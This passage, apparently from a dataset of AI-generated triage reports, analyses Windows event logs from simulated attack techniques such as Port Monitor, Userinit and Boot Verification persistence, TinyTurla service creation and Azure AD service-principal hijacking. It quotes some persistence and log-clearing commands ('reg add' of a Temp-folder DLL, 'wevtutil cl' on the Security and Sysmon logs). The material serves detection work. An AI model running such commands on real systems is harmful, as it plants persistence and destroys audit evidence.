  The specific command to export Sysmon logs using `wevtutil.exe` can indicate an attacker trying to copy log data for analysis or exfiltration.
  
### Assessment:
Based on the combination of observed behaviors, including excessive use of `wevtutil.exe`, PowerShell scripting for downloading files, and possible tampering with system logs, these logs suggest possible unauthorized or malicious activity. The behavior indicates attempts to manipulate or extract critical system information, which is consistent with a targeted attack scenario.

### Resolution:
- **Resolution: MALICIOUS**
  Based on the evidence of suspicious downloading activity via PowerShell, repeated log manipulations, and network-based actions, the activity observed in these logs gives strong indications of a compromise or malicious intent.

### Guidance on How to Proceed:
1. **Immediate Response:**
   - Isolate the affected system to prevent further potential data exfiltration or malware propagation.
   - Begin a more comprehensive forensic analysis on the system to identify and scope the extent of the compromise.

2. **Investigate Credentials and Access:**
   - Examine user activity logs for `SERVER002\\admin_test`. This user account seems to be associated with all suspicious actions. Verify if this account has been compromised or if this behavior is typical for this user.

3. **Review File Changes:**
   - Investigate any changes associated with the `settings.json` file and connections made to external domains as part of the PowerShell script execution.

4. **Audit and Reinforce Security Monitoring:**
   - Strengthen monitoring and logging of PowerShell activities across the network.
   - Implement restrictive execution policies to mitigate misuse of PowerShell for executing unapproved scripts. 

5. **Threat Landscape Analysis:**
   - Evaluate network traffic, endpoint behaviors, and system integrations that could be involved to identify any additional vectors or persistence mechanisms used by the attacker. 

Apply suitable countermeasures to prevent recurrence, such as employing app whitelisting, enforcing multi-factor authentication, and routinely educating system users on security best practices."
Add Port Monitor persistence in Registry,"Upon reviewing the log entries provided, we can derive several observations and assessments:

### Observations of Anomalous or Suspicious Behavior:
1. **Registry Modification for DLL Injection:**
   - A `cmd.exe` process executes with a command to add a registry entry using `reg.exe` for a print monitor DLL (`PortMonitor.dll`) pointing to a location within a user's `Temp` directory. This can potentially be indicative of DLL hijacking, a common malware persistence technique.

   ```
   CommandLine: ""cmd.exe"" /c reg add ""hklm\system\currentcontrolset\control\print\monitors\file"" /v ""Driver"" /d ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\bin\PortMonitor.dll"" /t REG_SZ /f
   ```

2. **Use of `whoami.exe`, `conhost.exe`, and `wevtutil.exe`:**
   - Multiple executions of the `whoami.exe` and `conhost.exe` which, on their own, are benign but could be suspicious in context if used as part of a larger malicious framework or script.
   - The use of `wevtutil.exe` can also be part of event log manipulation or querying, which might be useful during attacks to cover tracks.

3. **PowerShell Activity:**
   - Missing PowerShell logs prevent us from observing any direct command line PowerShell activity which might be indicative of suspicious scripting behavior.

4. **Microsoft Edge Update Activities:**
   - The logs illustrate multiple executions related to Microsoft Edge Update. This seems to be a legitimate update process as there is no indication that these processes or their lineage are from anything other than Microsoft Edge's normal update protocol.
  
### Threat Assessment:
- **Registry modification** is a significant indicator that potentially malicious activities might be occurring, as it's a common method for persistence.
- Usage of `wevtutil.exe`, without a clear benign purpose, could suggest log tampering or information gathering. 
- The frequency and context of some benign commands (`whoami`, `conhost`) coupled with other suspicious activities raise the possibility of a compromise.

### Resolution:
Based on the evidence and analysis presented, the final assessment is that these logs reflect activity that is SUSPICIOUS. The registry modification and the execution of system utilities command the need for further investigation. You should:

1. **Investigate further with additional context**: Examine the origin and integrity of the `PortMonitor.dll`. This file, being loaded by modifying registry, must be verified for any signs of tampering or being a malicious implant.

2. **Correlate with additional endpoint data**: Check for additional logs, endpoint detection tool alerts, or user behavior analytics to see if these actions coincide with known legitimate user activity (e.g., a known administrator performing a legitimate action).

3. **Monitor for additional anomalies**: Ensure that the environment continues to be monitored, particularly focusing on the behavior of additional spawned processes and any further use of services tools.

4. **Deploy a threat hunt focused on persistence mechanisms**: Looks for other signs on systems that may indicate persistence techniques, such as modified registry entries unrelated to software updates and checks of known authorized software behavior against these documents.

These actions will help determine whether there's an underlying threat actor influence and how to address it properly."
Azure - adding service principal to Azure role in subscription,"In the analysis of the provided Windows event logs, we've observed the following key points and activities:

### PowerShell Logs:
1. **PowerShell Script Execution**: The PowerShell log entries exhibit the execution of a script related to Azure Resource administration. The script performs the following actions:
   - Conversion of a plaintext password to a secure string using `ConvertTo-SecureString`.
   - Establishment of a connection to an Azure account using `Connect-AzAccount`.
   - Retrieval and assignment of roles in Azure by creating a new role assignment via `New-AzRoleAssignment`.
   
   This script appears to automate the administration of Azure resources, which is a typical use case in many environments. However, the use of plaintext passwords (`p4sswd`) in the script is considered insecure and might warrant further scrutiny concerning the security posture of the system or user account involved.

### Security Logs:
1. **User Enumeration via Security Auditing**: There are multiple `EventID 4798` events describing enumeration of user accounts (e.g., Guest, Administrator, DefaultAccount, etc.) using the process `CompatTelRunner.exe`. This auditing event usually indicates an attempt to list the groups a specific user is a member of.
2. **Privilege Assignment (EventID 4672)**: The event indicates `SERVER002$` (a computer account) tried to use multiple privileges, including high-level privileges like `SeDebugPrivilege` which sometimes could be utilized for malicious activities. 

The sequence and configuration of these events should be further investigated as multiple user accounts are queried quickly without apparent benign reasoning, which could suggest malicious reconnaissance activities.

### Sysmon Logs:
1. **Process Creation & Execution**: Several processes are executed by `SERVER002\admin_test`:
   - Execution of `powershell.exe` with a specific script correlated with the earlier mentioned Azure-related PowerShell activity.
   - Running system utilities like `wevtutil.exe` and `conhost.exe`.
   - Execution of utilities such as `hostname.exe` and `whoami.exe`, which can be used for environment reconnaissance.

These activities suggest reconnaissance or script execution that might relate to legitimate administrative tasks, but the context of the rapid and the parallel running of multiple utilities often flags possible suspicious behavior, as this closely aligns with common attack vectors such as privilege escalation and information gathering on compromised systems.

### Assessment:
The evidence from the logs points towards:
- **Unusual behavior** involving multiple account enumerations and privilege checks associated with potential reconnaissance activity.
- **Usage of administrative tools and scripts** in ways that could fit either legitimate administrative tasks or initial stages of system probing by a threat actor.

### Conclusion:
Based on the analysis, the verdict is **SUSPICIOUS**. There are activities that deviate from typical administrative behavior, possibly indicating preparation or reconnaissance processes related to malicious intent. We recommend:
- Further investigation of the user's recent activities with `SERVER002\admin_test` and related account access.
- Verification of the legitimacy and necessity of the PowerShell script making sure no unauthorized modifications or instructions have been added.
- Scanning for any signs of intrusion or compromise, particularly around the use of `CompatTelRunner.exe` and related auditing activities.
- Monitoring and restricting the accounts used for these activities to prevent further potential misuse."
TinyTurla backdoor service w64time,"### Detailed Analysis:

Upon analyzing the event logs provided, several indicators point toward suspicious activity, possibly indicating system compromise.

1. **Time Manipulation**: 
   - Security Event 4616 and System Event 1 reveal a time change on the system (`OldTime: 2024-10-27 12:55:31.3156746` to `NewTime: 2024-10-27 12:55:25.8021751`). The frequent adjustments of system time can be indicative of malicious intent, often used to cover up tracks by manipulating the time stamps of subsequent activities.

2. **Service Creation and Configuration**:
   - In the Sysmon logs, a series of events (Event IDs 1 and 5) starting at `2024-10-27 12:55:26` reveal the creation and configuration of a new service `W64Time` using the Windows command processor (`cmd.exe`). The command involves copying a `w64time.dll` file to the system directory and creating a service with the name `Windows 64 Time`. The use of `sc.exe` for service configuration, combined with registry modifications, suggests potential privilege escalation or persistence attempt:
     - Creating a seemingly legitimate service name to blend in (`W64Time`).
     - Modifying registry keys to point to a possibly malicious DLL.

3. **Privilege Assignments**:
   - Security Event 4672 shows that user `admin_test` was assigned multiple high-level privileges including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. Such privileges, when not necessary for typical user operations, can highlight potential privilege escalation attempts.

4. **Unusual Process Activities**:
   - The Sysmon log details several executions of system utilities like `wevtutil.exe`, `whoami.exe`, and `hostname.exe` by `SERVER002\admin_test`. While these utilities can be legitimate, their pattern of execution in conjunction with other suspicious activities raises red flags.

5. **Network Connections**:
   - From the Security log (Event ID 4624), there are NTLM authentication events with a `LogonType` of `3` (network logon) from `DESKTOP-3HL5B2P`, which should be examined further to see if they correlate with expected network behavior.

### Assessment:
The logs indicate a clear pattern of suspicious activity that suggests a compromise:
- Time manipulation is often leveraged by attackers to obfuscate activities.
- The service creation using potentially malicious DLL (`w64time.dll`) and subsequent registry alterations are strong indicators of persistence setup.
- The privilege escalation employing high-level security privileges combined with network logons should be further investigated.

### Resolution: SUSPICIOUS

### Guidance on How to Proceed:
1. **Containment**: Isolate the affected host (`Server002`) from the network to prevent further intrusion or spread.
2. **Investigation**: 
   - Analyze the contents and origins of `w64time.dll` for malware.
   - Review recent administrative and network activities associated with `admin_test`.
   - Investigate any outbound connections from `fe80::a8e:bf59:101d:d65d` to external IPs.
3. **Eradication and Recovery**:
   - Remove the unauthorized service `W64Time` and any associated files.
   - Roll back any unauthorized changes to system time and registry.
4. **Monitoring and Prevention**:
   - Enhance logging and monitoring to detect similar activities in the future.
   - Implement multi-factor authentication and least privilege access to reduce risks of privilege escalation.
  
Further forensic analysis and threat intelligence correlation are crucial to identify any additional compromised assets or potential indicators of compromise (IOCs)."
Create shortcut to cmd in startup folders,"**Detailed Analysis of Windows Event Logs:**

Upon examining the provided Windows event logs, several observations and analysis points can be made about potential indicators of malicious activities:

### Key Indicators:

1. **PowerShell Activity:**
   - The logs reveal the execution of PowerShell with a suspicious script that attempts to create a shortcut in the Windows Start Menu's Startup folder. The shortcut (`data.009.lnk`) is set to target `cmd.exe`, suggesting possible persistence mechanisms or backdoor setups.
   - This PowerShell activity is particularly concerning as it aligns with known tactics used by attackers to maintain persistence on hosts or execute malicious commands at startup.

2. **Process Execution Patterns:**
   - There are multiple instances of processes like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` running in quick succession. While these could be part of legitimate administrative activities, they can also be indicative of an attacker gathering information or manipulating event logs.
   - The execution of `wevtutil.exe`, especially in conjunction with simultaneous PowerShell usage, might suggest attempts to clear or backtrack logs.

3. **Microsoft Edge Update Processes:**
   - Several `MicrosoftEdgeUpdate.exe` processes are running, which could represent normal update activities. However, an instance running from a temporary directory (`C:\\Program Files (x86)\\Microsoft\\Temp\\EUD6ED.tmp\\`) raises suspicion. Executables running from temporary directories are typically anomalous and worth investigating as they often serve as a vector for malicious activities.
   - These edge update processes exhibit various command-line arguments aimed at service registration and configuration, which while common, in untrustworthy contexts could be suspicious.

4. **Time Synchronization Adjustments:**
   - The system logs indicate time adjustments. Time changes themselves are not inherently malicious but can be part of attacker techniques to obscure activities by manipulating time-based logs.

### Assessment:

Based on the indicators observed above, particularly the suspicious PowerShell activities with attempts to create startup links and the unconventional locations for executing Edge update processes, there is a clear cause for concern.

### Resolution:

- **Resolution: MALICIOUS**: The logs contain definitive indicators of potentially malicious behavior. The PowerShell script aiming to establish persistence and the suspicious execution of Edge update processes from temporary folders without clear necessity indicate a high likelihood of compromise.

### Guidance on How to Proceed:

1. **Immediate Action:**
   - Isolate the affected system to prevent further spread or compromise within the network.
   - Conduct a thorough inspection of the system for additional signs of compromise or malicious payloads.

2. **PowerShell and System Review:**
   - Identify and disable unauthorized startup entries and remove any suspicious `.lnk` files from startup directories.
   - Review all PowerShell scripts and command history on the affected machine to understand the extent of the activity.

3. **System and Network Monitoring:**
   - Increase monitoring of network traffic and endpoint activities for signs of lateral movement or data exfiltration.
   - Use threat intelligence services to correlate observed activities with known malicious indicators or patterns.

4. **Recovery and Hardening:**
   - After ensuring thorough cleaning, rebuild the system if necessary to remove all traces of the compromise.
   - Implement enhanced security measures and regular audits, focusing on application whitelisting, PowerShell logging, and endpoint detection and response solutions.

Given the evidence and recommendations, further forensic analysis and incident response measures should be pursued to fully understand and mitigate the threat."
Edit an existing time provider,"Based on the analysis of the provided logs, there are specific elements that suggest malicious activity. Notably, the following suspicious behavior was identified:

1. **Suspicious PowerShell Command Execution:** 
   - The logs show a PowerShell execution with command-line arguments that include commands to stop a service (`w32time`), copy a DLL file (`fileTest.dll`) to a new location, modify the registry to change Windows Time Service settings, and restart the service. This indicates a potential attempt to load a malicious DLL or manipulate system settings.
   - The use of `Copy-Item` to replace a file and `reg add` commands to change registry settings suggest system manipulation that is out of the ordinary for regular operations.

2. **Change in Time Events:**
   - Multiple `EventID 4616` logs from the Security event log indicate changes in the system time, which can be a tactic used by attackers to manipulate time-based security controls or to hide their tracks.

3. **Registry Modifications:**
   - The PowerShell logs corroborate the registry modification attempts recorded in the Sysmon logs, specifically targeting the Time Providers for NtpServer. This action is not normal and may be used to inject malicious code through a DLL.

4. **Use of High-Integrity Level:**
   - Several processes are run with high integrity, which could be indicative of an attempt to gain elevated privileges necessary for the execution of potentially harmful modifications or code installations.

5. **Other Noteworthy Processes:**
   - The execution of `wevtutil.exe`, `conhost.exe`, and `whoami.exe` in conjunction with admin privileges may signify enumeration activities often associated with further exploit phases.

Given these observations, there are strong indicators of malicious activity and compromise within these logs. The patterns observed, such as unauthorized changes to services, suspicious file copying, and potentially harmful PowerShell scripts altering system states, align with tactics used by attackers.

**Resolution: MALICIOUS**

**Guidance:**
- Immediately isolate the affected host (Server002) to prevent further potential damage or unauthorized access to the network.
- Conduct a thorough forensic analysis of the system to understand the extent of the compromise.
- Review any registry and file system changes, focusing on any other unusual files or scripts, particularly in common directories such as `Temp` and `Public`.
- Analyze the system's network traffic logs to identify any exfiltration attempts or external communications.
- Consider restoring the system from a backup taken before the suspicious activity occurred, and ensure all patches and updates are applied after restoration.
- Increase monitoring of similar systems within the network for any suspicious activity resembling the described pattern, and review and update any security policies or configurations that allowed this breach to occur."
Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry,"After analyzing the provided Windows event logs, several findings indicate potentially malicious or at least suspicious behavior. Here's a detailed analysis:

1. **Command Execution and Logs Clearing:**
   - Several instances of `wevtutil.exe` are executed to clear logs, which is suspicious. Specifically, the Security, System, and PowerShell event logs are cleared by the user `SERVER002\\admin_test`. This behavior is typically associated with adversaries attempting to cover their tracks post-compromise.
   - The command lines used indicate the logs being cleared:  
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl System`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`
   
2. **Suspicious PowerShell Command:**
   - The PowerShell log shows a command that modifies registry entries involving 'Security Packages'. It sets a new value to ""AtomicTest.dll"", which is not a typical or known security package utilized by Windows. This type of action could be indicative of a credential theft or privilege escalation attempt.

3. **Processes and Execution Context:**
   - The processes are running under the `SERVER002\\admin_test` and `NT AUTHORITY\\SYSTEM` accounts, with high integrity levels, suggesting administrative privilege use. 
   - The sequence of events and usage of the `powershell.exe` to alter important system configurations further nods to possible elevated privileges being leveraged improperly.

Based on these findings, I am drawing the following resolution:

**Resolution: MALICIOUS**

**Assessment and Guidance:**
- The activities as logged exhibit behaviors consistent with an advanced attack involving privilege escalation and potential persistence mechanisms (via registry modification) while also attempting to cover any tracks by clearing logs.
- Immediate actions should involve isolating the affected host 'Server002' for comprehensive forensic analysis, confirming the presence of any unauthorized DLLs or registry values, and ensuring that no backdoors or residual malicious artifacts remain.
- Review and strengthen logging mechanisms, possibly leveraging log shipping to a secure external server to prevent local tampering.
- Conduct a full investigation to identify potential exposure and affected accounts, and initiate an incident response plan to eradicate and recover from the threat."
HKLM - Append Command to Winlogon Userinit KEY Value,"### Analysis of the Logs

Let's evaluate the logs provided for any suspicious or potentially malicious activity.

#### Windows PowerShell Log Analysis:

1. **PowerShell Activity**: 
   - The PowerShell logs show that there was a script execution involving changes to the Windows Registry at the `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon` path:
     - The current value of ""Userinit"" was backed up to ""Userinit-backup"".
     - A new value was set for ""Userinit"" that includes `C:\Windows\System32\calc.exe`.

   - **Assessment**: Modifying the ""Userinit"" registry value to include launching `calc.exe` is highly suspicious. The ""Userinit"" registry entry is typically used for setting startup applications. Modifying this value to execute additional applications is a known persistence and privilege escalation technique often employed by malware to execute payloads upon user login.

#### Sysmon Log Analysis:

1. **Process Creation Events**:
   - The logs reflect several legitimate processes such as `svchost.exe`, `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `Microsoft Edge Installer`.
   - A PowerShell process was also started with the command detailing registry changes.

   - **Assessment**: The presence of `sysmon` events indicating PowerShell execution with the intent to change registry settings corroborates the potential malicious activity observed in the PowerShell logs. This supports the suspicion of registry modifications for persistence.

#### Application Log Analysis:

- No significant malicious activity was noted. The Application log contained entries related to software protection platform service, which appear benign and routine for system operations.

### Overall Assessment

Based on the PowerShell and Sysmon logs, there are clear indicators of potentially malicious behavior, specifically:

- The modification of ""Userinit"" in the registry to include `calc.exe` represents a classic persistence mechanism.

- This modification is part of a PowerShell script, and execution logs are present in both PowerShell and Sysmon logs, suggesting that this is not accidental or benign.

### Resolution

**Resolution**: **MALICIOUS**

The activity observed in the logs, particularly the PowerShell script involving alterations to the registry for startup application settings, likely indicates a malicious attempt to achieve persistence on the system.

### Guidance on How to Proceed

1. **Immediate Incident Response**:
   - Isolate the affected host from the network to prevent further potential compromise or lateral movement.
   - Conduct a deep forensic analysis of the system to understand the full impact and scope of the compromise.
   - Review other systems for similar indicators of compromise.

2. **Remediation Steps**:
   - Revert the changes made in the registry and ensure the integrity of critical Windows components.
   - Change all passwords associated with elevated privileges on the server to prevent unauthorized access.

3. **Long-term Security Measures**:
   - Implement restrictions on the execution of PowerShell scripts unless verified and necessary.
   - Enhance monitoring and alerting mechanisms for detecting similar patterns of activity in the future.
   - Conduct a security awareness training program for users to mitigate social engineering attacks that often lead to such compromises. 

This analysis indicates a serious threat, and prompt action is necessary to mitigate risks associated with this activity."
Azure AD Application Hijacking - Service Principal,"Upon reviewing the provided Windows event logs, particularly focusing on the Windows PowerShell logs, Sysmon logs, and the activities performed, here is the detailed analysis:

### Analysis of Logs:

1. **Windows PowerShell Log:**
   - The logs indicate that there was a PowerShell script executed that involved Azure AD commands. This script is trying to connect using a hardcoded password `p4sswd` converted to a secure string.
   - It attempts to fetch an Azure AD Service Principal with the command `Get-AzureADServicePrincipal -SearchString ""SuperSP""`.
   - There's creation of a self-signed certificate with a short expiration and immediate application of this certificate to the fetched Service Principal as a key credential.
   - A sleep command `Start-Sleep -s 30` is used, hinting at some delay possibly to avoid detection or synchronization purpose.
   - The final steps involve connecting to AzureAD using the newly created certificate; key phrases like ""Application Hijacking worked. Logged in successfully"" suggest a successful unauthorized access setup or test.

2. **Sysmon Log:**
   - Multiple processes related to PowerShell (powershell.exe), command line interface (conhost.exe), and eventing (wevtutil.exe) are being executed.
   - Execution of `powershell.exe` with commands matching the activities outlined in the PowerShell log suggests that the same script was executed at the system level.
   - The presence of `wevtutil.exe` indicates event log manipulations, possibly to export or clear logs, which raises suspicions of cover-up activities.
   - The processes `whoami.exe` and `hostname.exe`, though common, are executed with a high integrity level, which may indicate privilege levels higher than usual user operations.

### Conclusion:

- **Suspicious Activities:**
  - The execution of PowerShell scripts that create certificates, and try to use them for authentication to Azure AD, especially with terms like ""Application Hijacking"" and references to not leaving a ""backdoor"" open, are strong indicators of potentially malicious activities.
  - This behavior, alongside the sysmon entries for `wevtutil.exe`, suggests attempts to either test vulnerabilities, manipulate logs, or perform unauthorized access.

### Assessment:

Based on the analysis of the PowerShell script and the activities logged by Sysmon, the logs contain **SUSPICIOUS** activity, indicative of behavior that warrants further investigation to ensure that this is not a test or a training scenario mistakenly left open, or indeed a malicious exploit being conducted.

### Recommended Actions:

- **Immediate Investigation:** Immediate in-depth investigation should be conducted to confirm the intention of the script execution. If this was a sanctioned test, documentation and confirmation are required. Otherwise, it should be treated as unauthorized access.
- **Log Review and Preservation:** Ensure that all logs are reviewed and preserved for further forensic analysis.
- **Azure AD Security Review:** Conduct a review of the Azure AD configuration, focusing on application registrations, service principals, and any new credentials or permissions introduced.
- **Alert Incident Response Team:** Enable monitoring and alert your incident response team to ensure no further actions occur without scrutiny.

The situation is considered **SUSPICIOUS**, requiring cautious follow-up."
Creating Boot Verification Program Key for application execution during successful boot,"Upon analyzing the provided Windows event logs, here is a detailed assessment:

### Observations:

1. **Time Synchronization Adjustments:**
   - Multiple entries (EventID 24 and 1 in System log, EventID 4616 in Security log) indicate small time adjustments made by `svchost.exe`. These entries are typical of time synchronization tasks handled by the system's time service and do not inherently indicate malicious activity.

2. **Process Execution Analysis (Sysmon logs):**
   - **Execution of `wevtutil.exe` and `conhost.exe`:**
     - Several instances of `wevtutil.exe` and `conhost.exe` are seen launched by `admin_test`. This is not uncommon, as `wevtutil.exe` is used for managing Windows Event logs, and `conhost.exe` is associated with console windows. There is no immediate indication of malicious use from these entries alone.
   - **Cmd.exe with Suspicious Command Line:**
     - The command line argument `cmd.exe /c reg add ... ""C:\\Program Files\\Internet Explorer\\iexplore.exe""` suggests registry modification to leverage `iexplore.exe` in the BootVerificationProgram — a potential persistence mechanism possibly indicative of compromise or malware setup.
   - **Edge Updates:**
     - Multiple Sysmon events show processes related to Microsoft Edge updates (e.g., `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup.exe`) and appear to be legitimate system updates and service operations.

3. **Security Log Analysis:**
   - Privilege assignment (EventID 4672) shows user `admin_test` granted high-level privileges. This activity isn't inherently malicious when performed by legitimate system administrators. However, coupled with the suspicious registry modification, this warrants further investigation.

4. **Application and Windows Time Service Logs:**
   - Logs from Edge update mention standard service operations (e.g., service stopped), while no anomalous behavior is evident from other application logs.
   
### Assessment:

- **Benign Activities:**
  - Time synchronization and Windows Time Service logs depict normal system behavior. 
  - Execution of `wevtutil.exe` and Microsoft Edge update activities align with standard operations.

- **Suspicious Activities:**
  - The use of `cmd.exe` with a registry modification command is highly suspicious in nature and typically associated with unauthorized configuration changes that could potentially enable persistence or evasive techniques if not carried out by an authorized user with a justifiable purpose.
  - While high privileges of `admin_test` might be customary for admin users, the exact context and user intention should be verified considering the suspicious command.

### Recommendation & Resolution:

Based on the observations and potential risks, the activity within the logs is deemed as **SUSPICIOUS**. The use of `cmd.exe` for registry modification warrants further investigation to ascertain intent and legitimacy. It is recommended to:

- Verify the intention and necessity behind the specific registry modification.
- Conduct a thorough audit of `admin_test` user activities and privileges.
- Ensure endpoint protection and conduct a malware scan to rule out any active threats or compromises.
- Review security policies and access controls to prevent unverified privilege escalation actions.

This cautious approach will help ensure there is no hidden compromise or malicious activity evolving within the system."
